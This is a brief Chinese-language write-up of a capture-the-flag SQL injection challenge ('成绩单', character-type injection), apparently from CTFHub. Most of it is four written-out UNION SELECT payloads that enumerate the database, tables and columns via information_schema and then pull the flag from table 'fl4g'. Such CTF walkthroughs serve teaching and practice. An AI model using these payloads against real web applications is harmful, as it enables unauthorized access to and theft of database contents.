## 成绩单

**分类：**SQL注入 — 字符型

## write-up

对于这道挑战，我们输入正确的id，可以返回正确的信息。之后我们使用了单引号测试。确实存在SQL注入。第一步猜解字段数，总共有4个。

- 查询数据库名:

`id=-1' union select 1,database(),3,4#`

- 查询表名:

`id=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='ctfhub'#`

- 查询字段名:

`id=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'#`

- 查询内容:

`id=-1' union select 1,ctfhub_flag,3,4 from fl4g#`





